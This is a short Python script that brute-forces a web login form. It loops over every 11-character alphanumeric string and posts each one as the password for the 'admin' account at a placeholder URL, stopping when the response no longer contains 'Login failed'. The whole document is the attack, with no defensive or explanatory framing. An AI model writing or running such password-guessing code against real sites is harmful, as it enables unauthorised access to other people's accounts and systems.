import itertools
import requests

# Target URL
url = 'http://example.com/login'

# Define possible characters
characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'

# Generate all possible 11-character combinations
combinations = itertools.product(characters, repeat=11)

for combo in combinations:
    password = ''.join(combo)
    
    # Create a session
    session = requests.Session()

    # Data payload for POST request
    payload = {
        'username': 'admin',
        'password': password
    }

    # Send POST request
    response = session.post(url, data=payload)

    # Check if login was successful
    if 'Login failed' not in response.text:
        print(f'Successful login! Password: {password}')
        break
